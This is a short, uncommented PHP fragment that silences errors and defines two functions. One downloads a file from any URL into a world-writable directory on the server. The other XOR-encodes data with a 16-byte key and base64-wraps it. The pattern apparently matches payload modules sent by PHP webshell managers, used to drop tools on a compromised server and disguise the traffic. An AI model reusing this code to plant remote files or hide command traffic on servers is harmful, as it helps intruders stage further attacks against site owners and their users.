error_reporting(0);

function main($path = "",$url="")
{
	$filename=substr($url, strrpos($url,'/')+1); 
	if (!file_exists($path)) {
        mkdir($path,0777);
        @chmod($path,0777);
    }
    ob_start(); 
    readfile($url);
    $img = ob_get_contents();
    ob_end_clean(); 
    file_put_contents($path.$filename, $img);
	echo "Success";
}

function encrypt($data,$key)
{
	for($i=0;$i<strlen($data);$i++) {
    	$data[$i] = $data[$i]^$key[$i+5&15]; 
    }
	return base64_encode($data);
}